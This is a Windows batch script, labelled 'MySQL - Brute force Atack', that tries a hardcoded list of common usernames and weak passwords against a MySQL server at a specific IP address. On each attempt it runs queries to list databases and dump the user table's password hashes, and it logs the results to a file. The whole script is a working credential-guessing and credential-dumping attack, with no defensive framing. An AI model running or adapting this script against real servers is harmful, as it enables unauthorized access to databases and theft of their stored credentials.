@echo off
cls
color 2e
echo.
echo      ##########################################
echo      # MySQL - Brute force Atack .bat (by jj) #
echo      ##########################################
echo.


set list=177.52.183.137

set user=mysql phpmyadmin root admin administrator 4dm1n SYSDBA sa user mysqld server service
set pass=mysql phpmyadmin root admin masterkey admnistrator 4dm1n 123 1234 12345 123456 123456*a 654321*a 456123 123456789 sa toor a1b2c3 admin@123 4dm1n@123 root@123 service

echo inicio...


for %%a in (%list%) do (
 for %%u in (%user%) do (
    echo ### IP[ %%a ] - USUARIO[ %%u ] - SENHA[ vazio ]
    echo ####[IP: %%a - USUARIO: %%u - SENHA: vazio ] >> log.txt
    call mysql --host=%%a -u %%u --password= -e "select VERSION();" 2> error.txt
    call mysql --host=%%a -u %%u --password= -e "show databases;"  1>> log.txt 2> error.txt
    call mysql --host=%%a -u %%u --password= -e "use mysql;select Host,User,Password from user;quit"  1>> log.txt 2> error.txt
  for %%p in (%pass%) do (
    echo ### IP[ %%a ] - USUARIO[ %%u ] - SENHA[ %%p ]
    echo ####[IP: %%a - USUARIO: %%u - SENHA: %%p ] >> log.txt
    call mysql --host=%%a -u %%u --password=%%p -e "select VERSION();" 2> error.txt
    call mysql --host=%%a -u %%u --password=%%p -e "show databases;"  1>> log.txt 2> error.txt
    call mysql --host=%%a -u %%u --password=%%p -e "use mysql;select Host,User,Password from user;quit;" 1>> log.txt 2> error.txt

)))
 
del error.txt
echo.
echo fim...
echo.
color a
pause



